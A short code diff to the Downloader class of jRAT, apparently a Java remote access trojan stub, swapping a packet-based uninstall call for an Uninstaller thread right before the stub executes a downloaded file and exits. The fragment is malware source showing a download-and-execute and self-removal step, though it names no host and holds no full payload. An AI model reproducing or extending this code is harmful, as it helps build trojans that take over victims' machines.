@@ -9,7 +9,6 @@ import java.util.Random;
 
 import se.jrat.common.downloadable.Downloadable;
 import se.jrat.stub.packets.Temp;
-import se.jrat.stub.packets.incoming.Packet36Uninstall;
 
 import com.redpois0n.oslib.OperatingSystem;
 
@@ -76,7 +75,7 @@ public class Downloader extends Thread {
 					} catch (Exception ex) {
 						ex.printStackTrace();
 					}
-					new Packet36Uninstall().read();
+					new Uninstaller().start();
 					type.execute(file);
 					Configuration.running = false;
 					System.exit(0);
